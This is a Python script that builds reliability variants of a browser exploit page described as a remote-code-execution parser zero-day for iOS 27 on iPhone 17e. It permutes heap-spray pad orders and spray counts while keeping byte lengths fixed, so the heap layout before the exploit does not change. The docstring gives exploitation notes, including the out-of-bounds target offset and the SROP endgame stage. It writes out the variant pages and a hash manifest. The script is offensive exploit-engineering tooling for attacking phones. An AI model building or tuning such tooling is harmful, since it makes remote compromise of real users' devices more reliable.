#!/usr/bin/env python3
"""iOS 27 (iPhone 17e) parser-0day reliability variant set.

The RCE-proven page is p0_proven.html (8,647 raw / 3,680 zlib9, sha256
bf31f2f6...): stage A = compile-first self-sweep (C=34, SZ=957, N=2600,
pads MS=[512,640,768,896,1024,256,384,128,0,1536,2048,2560,1280,1792,3072],
PH=[4,12,20,28,36], VKS=[598,588,578,568,558], T[600]AB(72), D[800]AB(64)),
stage B/endgame = srop_v5_min.js (S2=6,099) inlined as a JS string and evaled
only after a stage-A forge.

Invariant enforced here: every variant keeps

    page raw length      == len(p0)                (8,647 B)
    stage-A script length== len(script(p0))        (8,524 chars)
    S2 length            == len(srop_v5_min.js)    (6,099 chars)

so the *pre-stage-A heap shape* (HTML string, script source string, compiled
top-level function) is unchanged.  Only sweep parameters that are
length-neutral are varied:

    - MS order   : a permutation of the same 15 values (same literal length)
    - N          : a 4-digit value (2600 -> 3000, same literal length)

Rationale (notes/ios27_reliability_20261108.md):
  * on the 17e the observed first-pad hits are M=512 (R=0) and M=640 (R=1)
    with the [512,640,768,...] order, so that order is the default;
  * the m768 order reproduces the earlier message that forged at R=4/M=768;
  * N=3000 extends the spray past the +1,311,372 OOB target by 400 blocks
    (~390 KB) at no literal-length cost.

NO code edit is made to stage A or stage B (a code edit changes the compiled
top-level bytecode and therefore the pre-heap, which is the documented cause
of the 6s/17e geometry losses).
"""
import hashlib
import json
import os
import re
import sys
import zlib

HERE = os.path.dirname(os.path.abspath(__file__))
PROVEN = os.path.join(HERE, "p0_proven.html")
SROP = os.path.join(HERE, "srop_v5_min.js")

SCRIPT_RE = re.compile(r"<script>(.*)</script>", re.S)
MS_RE = re.compile(r"var MS=\[([0-9,]+)\];")
N_RE = re.compile(r"var N=(\d{4}),S=new Array\(N\)")

MS_BASE = [512, 640, 768, 896, 1024, 256, 384, 128, 0, 1536, 2048, 2560, 1280, 1792, 3072]

VARIANTS = {
    # name: (MS order, N)
    "p0_proven":      (MS_BASE, 2600),                                      # exact RCE-proven bytes
    "p1_pad768":      ([768, 512, 640, 896, 1024, 256, 384, 128, 0, 1536, 2048, 2560, 1280, 1792, 3072], 2600),
    "p2_pad384":      ([384, 512, 640, 768, 896, 1024, 256, 128, 0, 1536, 2048, 2560, 1280, 1792, 3072], 2600),
    "p3_n3000":       (MS_BASE, 3000),
    "p4_n3000_pad768": ([768, 512, 640, 896, 1024, 256, 384, 128, 0, 1536, 2048, 2560, 1280, 1792, 3072], 3000),
}


def build_variant(html: str, ms, n: int) -> str:
    m = MS_RE.search(html)
    assert m, "MS literal not found"
    old = m.group(1)
    new = ",".join(str(v) for v in ms)
    assert len(new) == len(old), (len(new), len(old))
    assert sorted(new.split(",")) == sorted(old.split(",")), "MS must be a permutation"
    html = html[:m.start(1)] + new + html[m.end(1):]
    m2 = N_RE.search(html)
    assert m2, "N literal not found"
    assert len(str(n)) == 4
    html = html[:m2.start(1)] + str(n) + html[m2.end(1):]
    return html


def main() -> int:
    proven = open(PROVEN, encoding="utf-8").read()
    base_js = SCRIPT_RE.search(proven).group(1)
    srop = open(SROP, encoding="utf-8").read()
    assert len(srop) == 6099, len(srop)
    assert "'" not in srop and "\n" not in srop, "S2 must stay JSON-escaped one-line"
    manifest = {"proven": {"raw": len(proven.encode()), "zlib9": len(zlib.compress(proven.encode(), 9)),
                           "sha256": hashlib.sha256(proven.encode()).hexdigest()},
                "srop_len": len(srop), "variants": {}}
    assert manifest["proven"]["raw"] == 8647 and manifest["proven"]["zlib9"] == 3680
    assert manifest["proven"]["sha256"] == "bf31f2f66485174d086d520cbbf8f0434eed674c7282c0a87d731d46015248f8"

    ok = True
    for name, (ms, n) in VARIANTS.items():
        html = proven if name == "p0_proven" else build_variant(proven, ms, n)
        js = SCRIPT_RE.search(html).group(1)
        if name != "p0_proven":
            assert len(html.encode()) == len(proven.encode()), (name, len(html.encode()))
        assert len(js) == len(base_js), (name, len(js), len(base_js))
        assert len(srop) == 6099 and js.count(srop.replace("\\", "\\\\").replace('"', '\\"')) <= 1
        raw = html.encode()
        rec = {"raw": len(raw), "zlib9": len(zlib.compress(raw, 9)),
               "sha256": hashlib.sha256(raw).hexdigest(),
               "ms": ms, "N": n, "script_len": len(js)}
        manifest["variants"][name] = rec
        if name != "p0_proven":
            open(os.path.join(HERE, name + ".html"), "w", encoding="utf-8").write(html)
        print(f"{name:18s} raw={rec['raw']:5d} zlib9={rec['zlib9']:4d} "
              f"script={rec['script_len']:5d} N={n} sha256={rec['sha256'][:16]}")
        # JS syntax check with node if available
        if os.system("command -v node >/dev/null 2>&1") == 0:
            tmp = os.path.join(HERE, "_" + name + ".check.js")
            open(tmp, "w").write(js)
            rc = os.system(f"node --check {tmp} >/dev/null 2>&1")
            if rc != 0:
                ok = False
                print(f"  !! node --check FAILED for {name}")
            os.unlink(tmp)
    open(os.path.join(HERE, "MANIFEST.json"), "w").write(json.dumps(manifest, indent=1) + "\n")
    return 0 if ok else 1


if __name__ == "__main__":
    sys.exit(main())
